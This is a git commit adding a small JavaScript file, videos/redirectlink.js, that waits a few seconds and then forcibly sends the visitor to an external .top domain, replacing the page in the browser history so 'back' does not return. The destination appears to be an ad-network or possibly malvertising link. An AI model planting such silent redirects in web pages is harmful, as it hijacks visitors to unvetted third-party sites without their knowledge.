e31dfd1eec7aff4e0f58e1d61188cceaf73f6221
dexamax <166790203+dexamax@users.noreply.github.com>
2025-05-02 20:39:54 +0530

    Create redirectlink.js

---
+++ videos/redirectlink.js
@@ -0,0 +1,6 @@
+
+        // Set a timeout for redirecting
+        setTimeout(function() {
+            // Redirect to the specified URL and replace the current page in the history stack
+            window.location.replace("https://whoushex.top/4/9122239");  // Redirect to the URL
+        }, 4000);  // 3000 milliseconds = 3 seconds
